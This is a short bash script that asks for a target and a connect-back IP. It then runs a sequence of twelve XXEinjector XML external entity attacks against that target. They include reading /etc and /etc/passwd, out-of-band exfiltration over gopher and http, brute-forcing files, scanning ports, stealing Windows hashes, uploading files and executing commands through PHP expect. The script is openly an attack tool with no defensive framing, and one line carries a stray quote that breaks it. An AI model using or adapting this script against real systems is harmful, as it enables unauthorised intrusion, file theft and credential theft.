#!/bin/bash
echo -ne "[+] Enter Target: "
read target
echo -ne "[+] Enter your connect back IP: "
read ip
echo -e "[~] Performing all kinds of payloads"
echo -e "Exploit 1: Enumerating /etc directory in HTTPS application:"
ruby XXEinjector.rb --host=$target --path=/etc --file=/tmp/req.txt --ssl
echo -e "Exploit 2: Enumerating /etc directory using gopher for OOB method:"
ruby XXEinjector.rb --host=$target --path=/etc --file=/tmp/req.txt --oob=gopher
echo -e "Exploit 3: Second order exploitation:"
ruby XXEinjector.rb --host=$target --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt
echo -e "Exploit 4: Bruteforcing files using HTTP out of band method and netdoc protocol:"
ruby XXEinjector.rb --host=$target --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
echo -e "Exploit 5: Enumerating using direct exploitation:"
ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK
echo -e "Exploit 6: Enumerating unfiltered ports:"
ruby XXEinjector.rb --host=$target --file=/tmp/req.txt --enumports=all
echo -e "Exploit 7: Stealing Windows hashes:"
ruby XXEinjector.rb --host=$target --file=/tmp/req.txt --hashes
echo -e "Exploit 8: Uploading files using Java jar:"
ruby XXEinjector.rb --host=$target --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf
echo -e "Exploit 9: Executing system commands using PHP expect:"
ruby XXEinjector.rb --host=$target --file=/tmp/req.txt --oob=http --phpfilter --expect=ls
echo -e "Exploit 10: Testing for XSLT injection:"
ruby XXEinjector.rb --host=$target --file=/tmp/req.txt --xslt
echo -e "Exploit 11: Log requests only:"
ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt"
echo -e "Exploit 12: Special Request"
ruby XXEinjector.rb --host=$target --path=/etc/passwd --file=phprequest.txt --oob=http --verbose --phpfilter
